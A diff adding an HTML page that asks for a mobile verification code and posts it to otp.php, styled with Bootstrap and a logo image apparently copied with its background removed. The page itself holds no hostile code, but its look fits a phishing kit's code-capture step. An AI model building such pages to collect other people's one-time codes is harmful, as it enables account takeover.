@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="bootstrap.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <section>
+        <form method="post" action="otp.php">
+        <div class="pt-5">
+            <div class="mx-auto col-lg-6 col-md-10 col-12 bg-white card pt-3 rounded-2 pt-4">
+                <div class="text-center  pb-3">
+                    <img src="image/Ent_logo-removebg-preview.png" width="200" alt="">
+                </div>
+                <hr>
+                <div class="text-center">
+                    <p>We have sent a verification code to your mobile number</p>
+                </div>
+                <div style="padding-left: 60px; padding-right: 60px;">
+                    <div>
+                        <label class="fw-medium" for="">Authorization Code</label>
+                        <input name="code" class="form-control shadow-none" type="number" id="otp">
+                        <span id="otpError" class="error-d"><small>Please fill out this field.</small></span>
+                    </div>
+                    <div class="pt-3 pb-5">
+                        <button class="rounded-2 w-100 fw-medium auth-continue" onclick="otpContinue()"> Continue</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </form>
+    </section>
+    <script src="otp.js"></script>
+</body>
+
+</html>
